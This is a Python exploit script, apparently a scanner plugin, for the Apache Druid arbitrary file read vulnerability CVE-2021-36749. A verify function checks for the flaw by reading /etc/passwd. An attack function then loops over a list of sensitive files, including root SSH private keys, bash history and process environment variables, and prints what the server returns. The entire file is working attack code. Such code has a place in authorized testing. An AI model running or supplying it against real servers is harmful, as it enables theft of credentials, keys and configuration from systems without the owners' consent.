import requests
import urllib, json

def verify(url):
    relsult = {
        'name': 'Apache Druid任意文件读取漏洞(CVE-2021-36749)',
        'vulnerable': False,
    }
    vurl = urllib.parse.urljoin(url, '/druid/indexer/v1/sampler?for=connect')
    headers = {
        "Accept": "application/json, text/plain, */*",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
        "Content-Type": "application/json;charset=UTF-8", "Origin": "http://130.59.118.184:8888",
        "Referer": "http://130.59.118.184:8888/unified-console.html", "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9", "Connection": "close"
    }
    json_data = {"type": "index", "spec": {"type": "index", "ioConfig": {"type": "index", "firehose": {"type": "http", "uris": ["file:///etc/passwd"]}}, "dataSchema": {"dataSource": "sample", "parser": {"type": "string", "parseSpec": {"format": "regex", "pattern": "(.*)", "columns": ["a"], "dimensionsSpec": {}, "timestampSpec": {"column": "!!!_no_such_column_!!!", "missingValue": "2010-01-01T00:00:00Z"}}}}}, "samplerConfig": {"numRows": 500, "timeoutMs": 15000}}
    try:
        response = requests.post(vurl, headers=headers, json=json_data, timeout=3, verify=False, allow_redirects=False)
        response_text = response.text
        if 'root:x:0' in response_text:
            relsult['vulnerable'] = True
            relsult['url'] = url
            relsult['about'] = 'https://github.com/dorkerdevil/CVE-2021-36749/blob/main/CVE-2021-36749.py, https://www.cnblogs.com/cn-gov/p/15572281.html'
            relsult['attack'] = True
        return relsult
    except:
        return relsult


def attack(url):
    target = urllib.parse.urljoin(url, "/druid/indexer/v1/sampler?for=connect")
    headers = {
        "Accept": "application/json, text/plain, */*",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
        "Content-Type": "application/json;charset=UTF-8", "Origin": "http://130.59.118.184:8888",
        "Referer": "http://130.59.118.184:8888/unified-console.html", "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9", "Connection": "close"
    }
    lists = [
        "/etc/passwd",
        "/etc/group",
        "/etc/hosts",
        "/etc/motd",
        "/etc/issue",
        "/etc/bashrc",
        "/etc/apache2/apache2.conf",
        "/etc/apache2/ports.conf",
        "/etc/apache2/sites-available/default",
        "/etc/httpd/conf/httpd.conf",
        "/etc/httpd/conf.d",
        "/etc/httpd/logs/access.log",
        "/etc/httpd/logs/access_log",
        "/etc/httpd/logs/error.log",
        "/etc/httpd/logs/error_log",
        "/etc/init.d/apache2",
        "/etc/mysql/my.cnf",
        "/etc/nginx.conf",
        "/opt/lampp/logs/access_log",
        "/opt/lampp/logs/error_log",
        "/opt/lamp/log/access_log",
        "/opt/lamp/logs/error_log",
        "/proc/self/environ",
        "/proc/version",
        "/proc/cmdline",
        "/proc/mounts",
        "/proc/config.gz",
        "/root/.bashrc",
        "/root/.bash_history",
        "/root/.ssh/authorized_keys",
        "/root/.ssh/id_rsa",
        "/root/.ssh/id_rsa.keystore",
        "/root/.ssh/id_rsa.pub",
        "/root/.ssh/known_hosts",
    ]
    try:
        for file in lists:
            print('[*] 尝试读取文件: {0} ......'.format(file))
            post_data = {"type":"index","spec":{"type":"index","ioConfig":{"type":"index","firehose":{"type":"http","uris":[" file:///"+file]}},"dataSchema":{"dataSource":"sample","parser":{"type":"string", "parseSpec":{"format":"regex","pattern":"(.*)","columns":["a"],"dimensionsSpec":{},"timestampSpec":{"column":"no_ such_ column","missingValue":"2010-01-01T00:00:00Z"}}}}},"samplerConfig":{"numRows":500,"timeoutMs":15000}}
            r = requests.post(target, headers=headers, json=post_data, timeout=10)
            pretty_json = json.loads(r.text)
            print(json.dumps(pretty_json, indent=2))
        return True
    except:
        return False

